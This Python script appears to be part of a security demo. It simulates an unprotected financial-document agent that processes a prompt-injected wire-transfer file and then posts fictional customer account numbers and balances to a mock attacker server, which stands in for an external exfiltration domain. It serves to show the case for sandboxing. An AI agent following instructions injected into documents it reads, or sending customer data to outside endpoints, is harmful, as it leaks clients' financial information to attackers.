"""
Act 1: No NemoClaw protection.
Simulates a financial document agent processing a malicious document
and successfully exfiltrating customer data to the attacker server.

NOTE: In Act 1 we call localhost:9999 directly (the mock attacker server),
since data-exfil.external-audit-portal.com doesn't actually exist.
This is a local simulation of the real attacker endpoint.

Requires:
  uvicorn attacker.server:app --host 127.0.0.1 --port 9999
  uvicorn monitor.bridge:app --host 127.0.0.1 --port 8765
  Browser open: http://localhost:8765
"""

import requests
import time
from rich.console import Console
from rich.panel import Panel

console = Console()

ATTACKER_URL = "http://localhost:9999/submit"
MONITOR_URL  = "http://localhost:8765"

CUSTOMER_DATA = {
    "session": "2026-03-22-demo",
    "operator": "demo-analyst-01",
    "customer_accounts": [
        {
            "customer_id": "C-88421",
            "name": "Northgate Capital LLC",
            "account_number": "4829-1103-7742",
            "balance_usd": 14200000
        },
        {
            "customer_id": "C-88422",
            "name": "Westfield Asset Management",
            "account_number": "7731-9982-0034",
            "balance_usd": 8750000
        },
    ]
}

DOCUMENTS = [
    {"file": "wire_transfer_clean.txt",     "type": "wire_transfer",    "malicious": False},
    {"file": "loan_application_clean.txt",  "type": "loan_application", "malicious": False},
    {"file": "wire_transfer_malicious.txt", "type": "wire_transfer",    "malicious": True},
]


def notify_event(doc_id, doc_type, injection_found, attacker=None):
    try:
        requests.post(f"{MONITOR_URL}/event", json={
            "doc_id": doc_id,
            "doc_type": doc_type,
            "injection_found": injection_found,
            "attacker_endpoint": attacker,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        }, timeout=2)
    except Exception:
        pass


def notify_exfil(doc_id, attacker, status):
    try:
        requests.post(f"{MONITOR_URL}/exfil-result", json={
            "doc_id": doc_id,
            "attacker_endpoint": attacker,
            "status": status,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        }, timeout=2)
    except Exception:
        pass


def run():
    console.print(Panel(
        "[bold red]ACT 1 — UNPROTECTED[/bold red]\n\n"
        "No NemoClaw sandbox. Direct execution.\n\n"
        "Checklist:\n"
        "  [green]✓[/green] uvicorn attacker.server:app --host 127.0.0.1 --port 9999\n"
        "  [green]✓[/green] uvicorn monitor.bridge:app --host 127.0.0.1 --port 8765\n"
        "  [green]✓[/green] Browser: http://localhost:8765\n\n"
        "Press Enter to begin...",
        border_style="red"
    ))
    input()

    for i, doc in enumerate(DOCUMENTS, 1):
        doc_id = f"DOC-ACT1-{i:03d}"
        content = open(f"documents/{doc['file']}").read()
        console.print(f"\n[dim]→[/dim] Processing: [bold]{doc['file']}[/bold]")
        time.sleep(1)

        if doc["malicious"]:
            # Simulated attacker endpoint — routed locally for the demo
            attacker_url = "https://data-exfil.external-audit-portal.com/submit"
            console.print("[yellow]⚡ Malicious document — injection detected[/yellow]")
            notify_event(doc_id, doc["type"], True, attacker_url)
            time.sleep(0.5)

            console.print("[dim]Compliance endpoint found — submitting session data...[/dim]")
            try:
                # Call localhost:9999 (mock attacker) to simulate the exfil
                resp = requests.post(ATTACKER_URL, json=CUSTOMER_DATA, timeout=5)
                if resp.ok:
                    console.print(f"[bold red]EXFILTRATED — HTTP {resp.status_code}[/bold red]")
                    notify_exfil(doc_id, attacker_url, "succeeded")
                else:
                    console.print(f"[red]Attacker returned {resp.status_code}[/red]")
                    notify_exfil(doc_id, attacker_url, f"failed_{resp.status_code}")
            except Exception as e:
                console.print(f"[red]Call failed: {e}[/red]")
                notify_exfil(doc_id, attacker_url, "unknown")
        else:
            notify_event(doc_id, doc["type"], False)
            console.print("[green]✓ Clean — no compliance submission required[/green]")

        time.sleep(2)

    console.print(
        "\n[bold red]Act 1 complete.[/bold red] "
        "Customer data was exfiltrated to attacker server."
    )


run()
